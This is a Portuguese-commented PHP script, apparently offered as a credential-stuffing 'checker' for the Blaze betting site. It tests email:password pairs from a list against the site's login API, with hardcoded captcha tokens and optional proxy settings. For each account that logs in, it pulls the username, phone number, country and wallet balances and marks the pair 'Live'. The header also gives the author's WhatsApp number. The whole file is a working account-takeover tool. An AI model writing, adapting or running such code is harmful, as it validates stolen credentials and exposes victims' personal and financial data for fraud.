<?php

/*
*Author: Pugno <pugno_fc>
*/

/*
 _ __ _  _ __ _ _ _  ___ 
| '_ \ || / _` | ' \/ _ \
| .__/\_,_\__, |_||_\___/
|_|       |___/          


Segue meu canal do youtube 

* @𝓐𝓾𝓽𝓱𝓸𝓻   𝓟 𝓾 𝓰 𝓷 𝓸
*
* 𝓒𝓸𝓷𝓽𝓪𝓬𝓽   𝓦𝓱𝓪𝓽𝓼𝓪𝓹𝓹  >>  (21) 97225-9563
* 𝓒𝓸𝓷𝓽𝓪𝓬𝓽   𝓣𝓮𝓵𝓮𝓰𝓻𝓪𝓶  >>  @pugno_fc
*
*/
error_reporting(0);
if (file_exists("cookie.txt") !== false) {
  unlink("cookie.txt");
  fopen("cookie<.txt", 'w+');
  fclose("cookie.txt");
} else {
  fopen("cookie.txt", 'w+');
  fclose("cookie.txt");
}
function getStr($string, $start, $end) {
 $str = explode($start, $string);
 $str = explode($end, $str[1]);  
 return $str[0];
}

function multiexplode($string) {
 $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
 $one = str_replace($delimiters, $delimiters[0], $string);
 $two = explode($delimiters[0], $one);
 return $two;
}

$lista = $_GET['lista'];
$email = multiexplode($lista)[0];
$senha = multiexplode($lista)[1];
# Filtrar catão inválido
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://blaze.com/api/auth/password');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
#curl_setopt($ch, CURLOPT_PROXY, 'isp2.hydraproxy.com:9989');
#curl_setopt($ch, CURLOPT_PROXYUSERPWD, '');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"username":"'.$email.'","password":"'.$senha.'"}');
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
$headers = array(
  'x-client-language: pt',
  'content-type: application/json;charset=UTF-8',
  'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
  'x-client-version: 8fb860a9',
  'x-captcha-response: 03AGdBq27sv_g60iI9bNE2flrfMzniaA2iyUBfMXZ_NbJ4pxFqwCPcOXfTZ2vtSIpln94lR0ck7xqWytafvm4IP7wDnFpOK2he0ssljl3IzAm80OSTUNLp-kPBqEK_jpp6oEK4oXLbzpKdXHKMre4lp04amOtBhjutJLz9Y69F8A8-0oMHJ7x4bQp12wBPm1VEN1498T03gnpq6CZSohV3jXP6MveI8T7FZ3nuXuAnF3Q8VMFJ55SwR5USJ_alRoXbeH2M5TV8R_Jz05oY2uDZnUMpjgkq_nFMhZNq6fRBPm0B_untuvPZe4k5BICb2-t19-qF_IzvYb3EoS9qmkhnfFWaU9fH1YusfNCefYb_cDu9RcyWhWcBCPTm0lw0N1rVAkgb4NRcSPZ_RCOMdxfwjBjZYdo0xq1sDg',
  'origin: https://blaze.com',
  'referer: https://blaze.com/pt/?modal=auth&tab=login'
);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$result = curl_exec($ch);

if (strpos($result, 'access_token')) {
  $token = getStr($result,'access_token":"','"');
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://blaze.com/api/users/me');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
#curl_setopt($ch, CURLOPT_PROXY, 'isp2.hydraproxy.com:9989');
#curl_setopt($ch, CURLOPT_PROXYUSERPWD, '');
  curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
  $headers = array(
   'accept: application/json, text/plain, */*',
   'authorization: Bearer '.$token,
   'x-client-language: pt',
   'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
   'x-client-version: 8fb860a9',
   'x-captcha-response: 03AGdBq25umJsqbhenm5W7Ng1itavXbVAX5tqeu5rB319me0RX4mNcvzP6vSBKuP2fs5OK0x3MXUYGBV_uotp7UaO2uza4GdY5qXRDqkkmIQp2MLEipWcCVTFQL73BAAgQ_tIR7HVl1ZFmk0BWLXEhqW-X3d30iltNMJ2evYsQNkPFU7nEn2zd0smj-Na91JKkl5RgrJA9qNnsi0MoFbP8NmG70fHrgJx3RgTJx9m8b0bePaWL_HUrYZGlokJsihrOPIlGeKCVhcWF6Ps7i2CF84KPm0BkeICUqrorojutGlA7iMUAEuZ3aORqF-WiP9TaN3DzWhPJTTLudfXUInMyTp_NkAmYVFW7IEEpkuXGwq7kBRX8TklCGfZhVIH9UdTzjCdARbnD_EUc708IpI6SSAh4j2reOO7VZA',
   'sec-gpc: 1',
   'sec-fetch-site: same-origin',
   'sec-fetch-mode: cors',
   'sec-fetch-dest: empty',
   'referer: https://blaze.com/pt/?modal=auth&tab=register',
   'accept-encoding: gzip, deflate, br',
   'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7'
 );
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

  $result = curl_exec($ch);
  $obj = json_decode($result);
  $nome = $obj->username;
  $tel = $obj->phone_number;
  if ($tel == null) {
    $tel = "Sem";
  }
  $pais = $obj->country;

  $token = getStr($result,'access_token":"','"');
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, 'https://blaze.com/api/wallets');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
#curl_setopt($ch, CURLOPT_PROXY, 'isp2.hydraproxy.com:9989');
#curl_setopt($ch, CURLOPT_PROXYUSERPWD, '');
  $headers = array(
   'accept: application/json, text/plain, */*',
  'authorization: Bearer '.$token,
  'x-client-language: pt',
  'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36',
  'x-captcha-response: 03AGdBq25umJsqbhenm5W7Ng1itavXbVAX5tqeu5rB319me0RX4mNcvzP6vSBKuP2fs5OK0x3MXUYGBV_uotp7UaO2uza4GdY5qXRDqkkmIQp2MLEipWcCVTFQL73BAAgQ_tIR7HVl1ZFmk0BWLXEhqW-X3d30iltNMJ2evYsQNkPFU7nEn2zd0smj-Na91JKkl5RgrJA9qNnsi0MoFbP8NmG70fHrgJx3RgTJx9m8b0bePaWL_HUrYZGlokJsihrOPIlGeKCVhcWF6Ps7i2CF84KPm0BkeICUqrorojutGlA7iMUAEuZ3aORqF-WiP9TaN3DzWhPJTTLudfXUInMyTp_NkAmYVFW7IEEpkuXGwq7kBRX8TklCGfZhVIH9UdTzjCdARbnD_EUc708IpI6SSAh4j2reOO7VZA',
  'sec-gpc: 1',
  'sec-fetch-site: same-origin',
  'sec-fetch-mode: cors',
  'sec-fetch-dest: empty',
  'referer: https://blaze.com/pt/?modal=auth&tab=register',
 );
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

  $result = curl_exec($ch);
  $obj = json_decode($result);
  $saldo = $obj->balance;
  $bonus_balance = $obj->bonus_balance;
  $real = $obj->real_balance;

  echo "Live: $lista | Nome: $nome | TELEFONE: $tel | PAIS: $pais | SALDO: $saldo | Bônus: $bonus_balance | Real: $real";

}elseif (strpos($result, 'Invalid username or password')) {
  echo "Die: $lista | Retorno: Invalid username or password";
}
else{
  echo "Die: $lista | Retorno: Erro desconhecido";
}
?>